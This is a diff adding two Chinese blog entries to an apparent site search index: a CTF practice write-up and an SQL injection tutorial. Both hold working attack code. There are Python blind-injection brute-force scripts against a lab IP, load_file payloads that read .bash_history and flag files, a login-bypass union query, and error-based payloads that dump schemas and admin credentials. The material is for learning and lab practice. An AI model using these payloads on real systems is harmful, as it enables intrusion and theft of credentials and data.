@@ -1,6 +1,191 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>0608练习</title>
+    <url>/2020/06/08/0608%E7%BB%83%E4%B9%A0/</url>
+    <content><![CDATA[<h2 id="0x01时间盲注"><a href="#0x01时间盲注" class="headerlink" title="0x01时间盲注"></a>0x01时间盲注</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># admin'/**/or/**/1&lt;&gt;1#</span></span><br><span class="line">url = <span class="string">"http://182.92.181.252:18005/index.php"</span></span><br><span class="line"></span><br><span class="line">alist = <span class="string">"0123456789abcdefghijklmn&#123;&#125;"</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"aaa' or if((select mid((select flag from flag_is_here),&#123;&#125;,1)='&#123;&#125;'),sleep(5),0)#"</span></span><br><span class="line">datas = &#123;<span class="string">"username"</span>: <span class="string">""</span>&#125;</span><br><span class="line">tmp_OK = <span class="string">""</span></span><br><span class="line">tmp = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(alist)):</span><br><span class="line">        startTime = time.time()</span><br><span class="line">        payload = payload1.format(str(j), alist[i])</span><br><span class="line">        datas[<span class="string">"username"</span>] = payload</span><br><span class="line">        r = requests.post(url=url, data=datas)</span><br><span class="line">        endtime = time.time()</span><br><span class="line">        <span class="keyword">if</span> endtime-startTime&gt;<span class="number">2</span>:</span><br><span class="line">            tmp_OK += alist[i]</span><br><span class="line">            <span class="keyword">print</span> tmp_OK</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02二次注入真题"><a href="#0x02二次注入真题" class="headerlink" title="0x02二次注入真题"></a>0x02二次注入真题</h2><h5 id="源代码如下"><a href="#源代码如下" class="headerlink" title="源代码如下"></a>源代码如下</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);</span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>经过代码审计和老师课堂提示，直接登录发贴，留言板闭合写SQL。通过发帖，在category中放入payload，存入数据库中，不过这一过程payload因为对单引号等作了转义，不会被触发，只有在发帖成功后，在留言comment，调用insert语句时因为没有对数据库取出的category进行转义，直接拼接才会触发payload。</p>
+<h5 id="1、读取-bash-history（老师课堂已提示）"><a href="#1、读取-bash-history（老师课堂已提示）" class="headerlink" title="1、读取.bash_history（老师课堂已提示）"></a>1、读取.bash_history（老师课堂已提示）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&apos;,content=(select (load_file(&apos;/home/www/.bash_history&apos;))),/*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/0608%E7%BB%83%E4%B9%A0/image-20200608204055229.png" alt="image-20200608204055229"></p>
+<h5 id="2、读取-DS-Store"><a href="#2、读取-DS-Store" class="headerlink" title="2、读取.DS_Store"></a>2、读取.DS_Store</h5><p>可以看到html.zip里面有一个.DS_Store文件，复制到/var/www/html目录下后被删除了，但是在/tmp/下只是删除了压缩包，但是因为有解压的过程，所以解压后生成的文件夹html里还存在.DS_Store文件，读取这个文件。 </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&apos;, content=(select (load_file(&apos;/tmp/html/.DS_Store&apos;))),/*</span><br></pre></td></tr></table></figure>
+
+<p>这儿由于文件太大，不能完全显示，所以用十六进制编码，然后找个网站解码就行了。改为payload：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a', content=(<span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">load_file</span>(<span class="string">'/tmp/html/.DS_Store'</span>))),<span class="comment">/*</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/0608%E7%BB%83%E4%B9%A0/image-20200608204618007.png" alt="image-20200608204618007"></p>
+<h5 id="3、读取-flag-8946e1ff1ee3e40f-php"><a href="#3、读取-flag-8946e1ff1ee3e40f-php" class="headerlink" title="3、读取 flag_8946e1ff1ee3e40f.php"></a>3、读取 flag_8946e1ff1ee3e40f.php</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&apos;,content=(select hex(load_file(&apos;/var/www/html/flag_8946e1ff1ee3e40f.php&apos;))),/*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/0608%E7%BB%83%E4%B9%A0/image-20200608204733560.png" alt="image-20200608204733560"></p>
+<h2 id="0x03union查询灵活运用"><a href="#0x03union查询灵活运用" class="headerlink" title="0x03union查询灵活运用"></a>0x03union查询灵活运用</h2><h4 id="burp截包，发现tip"><a href="#burp截包，发现tip" class="headerlink" title="burp截包，发现tip"></a>burp截包，发现tip</h4><p><img src="/images/0608%E7%BB%83%E4%B9%A0/image-20200608201716740.png" alt="image-20200608201716740"></p>
+<h4 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密"></a>base64解密</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT username,password FROM admin WHERE username='"</span>.$username.<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($row) &amp;&amp; $row[<span class="string">'password'</span>]===md5($password))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="构造union-select"><a href="#构造union-select" class="headerlink" title="构造union select"></a>构造union select</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username=-1' union <span class="keyword">select</span> <span class="string">'admin'</span>,<span class="string">'c4ca4238a0b923820dcc509a6f75849b'</span><span class="comment">#&amp;password=1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04盲注绕过"><a href="#0x04盲注绕过" class="headerlink" title="0x04盲注绕过"></a>0x04盲注绕过</h2><p>FUZZ被过滤的字符，发现<code>,</code>、 <code>union</code>等被过滤，<code>select</code>、<code>substr</code>等可用</p>
+<p><img src="/images/0608%E7%BB%83%E4%B9%A0/image-20200608202240659.png" alt="image-20200608202240659"></p>
+<h4 id="确认布尔盲注"><a href="#确认布尔盲注" class="headerlink" title="确认布尔盲注"></a>确认布尔盲注</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">username=a'/**/or/**/1&lt;&gt;2#&amp;password=11</span><br></pre></td></tr></table></figure>
+
+<h4 id="绕过逗号过滤"><a href="#绕过逗号过滤" class="headerlink" title="绕过逗号过滤"></a>绕过逗号过滤</h4><p>参考  <a href="https://www.cnblogs.com/hackxf/p/9490534.html" target="_blank" rel="noopener">https://www.cnblogs.com/hackxf/p/9490534.html</a> </p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 参考</span></span><br><span class="line"><span class="keyword">select</span> user_id,<span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">mid</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">2</span>))=<span class="number">115</span>) ;</span><br></pre></td></tr></table></figure>
+
+<p><strong>根据上课源代码，构造SQL</strong></p>
+<p><img src="/images/0608%E7%BB%83%E4%B9%A0/image_3.png" alt="image_3"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 构造</span></span><br><span class="line">a'<span class="comment">/**/</span>or<span class="comment">/**/</span>(ascii(substring((<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">password</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">admin</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="number">1</span>))&lt;&gt;<span class="number">55</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="1、burp爆破"><a href="#1、burp爆破" class="headerlink" title="1、burp爆破"></a>1、burp爆破</h4><p>爆破出的结果放到excel中排序，再解码</p>
+<p><img src="/images/0608%E7%BB%83%E4%B9%A0/image-20200608205723269.png" alt="image-20200608205723269"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">55</span>,<span class="number">50</span>,<span class="number">98</span>,<span class="number">51</span>,<span class="number">99</span>,<span class="number">98</span>,<span class="number">55</span>,<span class="number">98</span>,<span class="number">53</span>,<span class="number">53</span>,<span class="number">98</span>,<span class="number">49</span>,<span class="number">98</span>,<span class="number">102</span>,<span class="number">102</span>,<span class="number">50</span>,<span class="number">52</span>,<span class="number">51</span>,<span class="number">100</span>,<span class="number">54</span>,<span class="number">98</span>,<span class="number">97</span>,<span class="number">101</span>,<span class="number">49</span>,<span class="number">102</span>,<span class="number">50</span>,<span class="number">48</span>,<span class="number">51</span>,<span class="number">57</span>,<span class="number">99</span>,<span class="number">98</span>,<span class="number">51</span>]</span><br><span class="line">i = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> a:</span><br><span class="line">    i+=chr(x)</span><br><span class="line"><span class="keyword">print</span> len(a)</span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line"><span class="comment"># 72b3cb7b55b1bff243d6bae1f2039cb3</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2、脚本爆破"><a href="#2、脚本爆破" class="headerlink" title="2、脚本爆破"></a>2、脚本爆破</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># admin'/**/or/**/1&lt;&gt;1#</span></span><br><span class="line">url = <span class="string">"http://182.92.181.252:18006/index.php"</span></span><br><span class="line"><span class="comment">#payload1 = "aaa' or if((select mid((select flag from flag_is_here),&#123;&#125;,1)='&#123;&#125;'),1,0)#"</span></span><br><span class="line">payload2 = <span class="string">"a'/**/or/**/(ascii(substring((select/**/password/**/from/**/admin)/**/from/**/&#123;&#125;))&lt;&gt;&#123;&#125;)#"</span></span><br><span class="line">datas = &#123;<span class="string">"username"</span>: <span class="string">""</span>, <span class="string">"password"</span>:<span class="string">"1"</span>&#125;</span><br><span class="line">tmp_OK = <span class="string">""</span></span><br><span class="line">tmp = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">        payload = payload2.format(str(j), str(i))</span><br><span class="line">        datas[<span class="string">"username"</span>] = payload</span><br><span class="line">        r = requests.post(url=url, data=datas)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Username Wrong"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            tmp_OK += chr(i)</span><br><span class="line">            <span class="keyword">print</span> tmp_OK</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="登录得到flag"><a href="#登录得到flag" class="headerlink" title="登录得到flag"></a>登录得到flag</h4><p><img src="/images/0608%E7%BB%83%E4%B9%A0/image-20200608205959653.png" alt="image-20200608205959653"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF练习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入漏洞</title>
+    <url>/2020/06/08/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image_3.png" alt="image_3"></p>
+<h3 id="SQL查询的基本过程"><a href="#SQL查询的基本过程" class="headerlink" title="SQL查询的基本过程"></a>SQL查询的基本过程</h3><p><em>此处仅以mysql + php 为例（关系型数据库）</em></p>
+<p>php sql查询的几种方式：</p>
+<ul>
+<li>mysql扩展（逐渐废弃）</li>
+<li>mysqli扩展</li>
+<li>pdo扩展</li>
+</ul>
+<h4 id="mysql拓展"><a href="#mysql拓展" class="headerlink" title="mysql拓展"></a>mysql拓展</h4><ol>
+<li>mysql_connect函数连接mysql</li>
+<li>mysql_select_db选中数据库</li>
+<li>mysql_query查询数据库</li>
+<li>mysql_fetch_assoc获取查询结果</li>
+<li>mysql_close关闭连接</li>
+</ol>
+<h4 id="mysqli拓展"><a href="#mysqli拓展" class="headerlink" title="mysqli拓展"></a>mysqli拓展</h4><ol>
+<li>New mysqli初始化mysql对象</li>
+<li>mysqli-&gt;select_db 选择数据库</li>
+<li>Mysqli-&gt;query 查询数据库</li>
+<li>res-&gt;fetch_assoc 获取查询结果</li>
+<li>mysqli-&gt;close关闭数据库</li>
+</ol>
+<h4 id="PDO拓展"><a href="#PDO拓展" class="headerlink" title="PDO拓展"></a>PDO拓展</h4><ol>
+<li><p>New pdo初始化mysql对象</p>
+<p>Pdo string: mysql:host=localhost;dbname=test</p>
+</li>
+<li><p>pdo-&gt;prepare选择数据库</p>
+</li>
+<li><p>stmt-&gt;bindValue绑定参数</p>
+</li>
+<li><p>stmt-&gt;execute执行sql语句</p>
+</li>
+<li><p>stmt-&gt;fetch(PDO::FETCH_ASSOC)获取查询结果</p>
+</li>
+<li><p>Pdo=null 关闭连接，回收资源</p>
+</li>
+</ol>
+<p>特点：所有类型数据库都可以通用，无需关心后端数据库，引入sql语句预处理，大大降低sql注入的可能性，是SQL注入漏洞修复的有效方案之一。</p>
+<h2 id="手工注入基础-Union-注入"><a href="#手工注入基础-Union-注入" class="headerlink" title="手工注入基础 - Union 注入"></a>手工注入基础 - Union 注入</h2><ol>
+<li><p>注入点判断：</p>
+<ul>
+<li>单引号无返回</li>
+<li>1’ || ‘1’=’1返回正常</li>
+<li>1’ and sleep(3)# 网页延时</li>
+</ul>
+</li>
+<li><p>简单测试一下服务器端过滤的字符</p>
+<ul>
+<li>单双引号</li>
+<li>/**/</li>
+<li>sql语句的关键字 union/select等</li>
+</ul>
+</li>
+<li><p>字段猜测：<br>(1). 字段数量（确定查询的列数）：<code>1&#39; order by 3 #</code><br>(2). 字段偏移（确定有回显的位置）： <code>1&#39; union select 1,2,3 limit 1,1%23</code></p>
+</li>
+<li><p>注入数据：<br>(1). 查询基本信息 <code>1&#39; union select 1,version(),user() limit 1,1%23</code></p>
+<p>version() 函数<br>user() 函数<br>database() 函数</p>
+<p>(2). 查询数据库名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&apos; union select 1,2,schema_name from information_schema.schemata limit 1,1%23</span><br><span class="line">1&apos; union select 1,2,group_concat(schema_name) from information_schema.schemata limit 1,1%23</span><br></pre></td></tr></table></figure>
+
+<p>(3). 查询表名<br><code>1&#39; union select 1,2,table_name from information_schema.tables where table_schema= ‘level1’ limit 1,1%23</code></p>
+<p>(4). 查询字段名<br><code>1&#39; union select 1,2,column_name from information_schema.columns where table_name=‘secrets’ limit 1,1%23</code></p>
+<p>(5). 查询具体内容：<br><code>1&#39; union select 1,2,hex(secret) from level1.secrets limit 1,1%23</code></p>
+</li>
+</ol>
+<h3 id="MySQL中的常用函数"><a href="#MySQL中的常用函数" class="headerlink" title="MySQL中的常用函数"></a>MySQL中的常用函数</h3><ul>
+<li>if(cond,v_1,v_2) 如果cond，则返回v_1,否则返回v_2</li>
+<li>sleep(N) 数据库延迟N秒后返回结果</li>
+<li>ASCII(char) 返回字符的ascii码值</li>
+<li>concat(s1,s2,……,sn) 拼接字符串</li>
+<li>group_concat(table_name) 将多行结果合并成一列</li>
+<li>char(97,100,109,105,110) 将十进制数字变成字符</li>
+<li>left(str,x) 返回str最左边的x个字符，可以当成常用的字符截取函数使用</li>
+<li>substring(str,pos,len)从str的pos开始，截取长度为len的字符串</li>
+<li>benchmark(loop_num,task) 进行性能基准测试</li>
+<li>floor(number) 取数字的整数部分</li>
+<li>rand() 产生随机数，返回是一个小数</li>
+<li>strcmp() 比较两个字符串，如果相等返回0，大于返回1，小于返回-1</li>
+</ul>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>利用数据库爆出的错误，将需要查询的内容外带出来，造成报错注入。</p>
+<h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><ul>
+<li><p>数据库版本</p>
+<p><code>sql.php?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></p>
+</li>
+<li><p>连接用户</p>
+<p><code>sql.php?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></p>
+</li>
+<li><p>连接数据库</p>
+<p><code>sql.php?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></p>
+</li>
+<li><p>暴库</p>
+<p><code>sql.php?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></p>
+</li>
+<li><p>暴表</p>
+<p><code>sql.php?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></p>
+</li>
+<li><p>暴字段</p>
+<p><code>sql.php?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></p>
+</li>
+<li><p>暴内容<br><code>sql.php?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></p>
+</li>
+</ul>
+<h4 id="ExtractValue-有长度限制-最长32位"><a href="#ExtractValue-有长度限制-最长32位" class="headerlink" title="ExtractValue(有长度限制,最长32位)"></a>ExtractValue(有长度限制,最长32位)</h4><ul>
+<li><p>暴版本</p>
+<p><code>sql.php?id=1+and extractvalue(1, concat(0x7e, (select @@version),0x7e))</code></p>
+</li>
+<li><p>暴内容</p>
+<p><code>sql.php?id=1+and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)))</code></p>
+</li>
+</ul>
+<h4 id="UpdateXml-有长度限制-最长32位"><a href="#UpdateXml-有长度限制-最长32位" class="headerlink" title="UpdateXml(有长度限制,最长32位)"></a>UpdateXml(有长度限制,最长32位)</h4><ul>
+<li><p>暴版本</p>
+<p><code>sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code></p>
+</li>
+<li><p>暴内容</p>
+<p><code>sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)</code></p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;d6a2c778690d0fac1d6d14d468e5c62a&#125;</span><br><span class="line">68</span><br><span class="line"></span><br><span class="line">flag&#123;d6a2&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1932	12	49	200	false	false	1013	</span><br><span class="line">1944	24	49	200	false	false	1013	</span><br><span class="line">1962	2	50	200	false	false	1013	</span><br><span class="line">1976	16	50	200	false	false	1013	</span><br><span class="line">1986	26	50	200	false	false	1013	</span><br><span class="line">2004	4	51	200	false	false	1013	</span><br><span class="line">2018	18	51	200	false	false	1013	</span><br><span class="line">2028	28	51	200	false	false	1013	</span><br><span class="line">2032	32	51	200	false	false	1013	</span><br><span class="line">2057	17	52	200	false	false	1013	</span><br><span class="line">2089	9	53	200	false	false	1013	</span><br><span class="line">2090	10	53	200	false	false	1013	</span><br><span class="line">2140	20	54	200	false	false	1013	</span><br><span class="line">2161	1	55	200	false	false	1013	</span><br><span class="line">2167	7	55	200	false	false	1013	</span><br><span class="line">2269	29	57	200	false	false	1013	</span><br><span class="line">3862	22	97	200	false	false	1013	</span><br><span class="line">3883	3	98	200	false	false	1013	</span><br><span class="line">3886	6	98	200	false	false	1013	</span><br><span class="line">3888	8	98	200	false	false	1013	</span><br><span class="line">3891	11	98	200	false	false	1013	</span><br><span class="line">3893	13	98	200	false	false	1013	</span><br><span class="line">3901	21	98	200	false	false	1013	</span><br><span class="line">3911	31	98	200	false	false	1013	</span><br><span class="line">3925	5	99	200	false	false	1013	</span><br><span class="line">3950	30	99	200	false	false	1013	</span><br><span class="line">3979	19	100	200	false	false	1013	</span><br><span class="line">4023	23	101	200	false	false	1013	</span><br><span class="line">4054	14	102	200	false	false	1013	</span><br><span class="line">4055	15	102	200	false	false	1013	</span><br><span class="line">4065	25	102	200	false	false	1013</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>靶机渗透测试</category>
+      </categories>
+      <tags>
+        <tag>靶机渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux</title>
     <url>/2020/04/04/Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/</url>
     <content><![CDATA[<h3 id="待补充"><a href="#待补充" class="headerlink" title="待补充"></a>待补充</h3>]]></content>
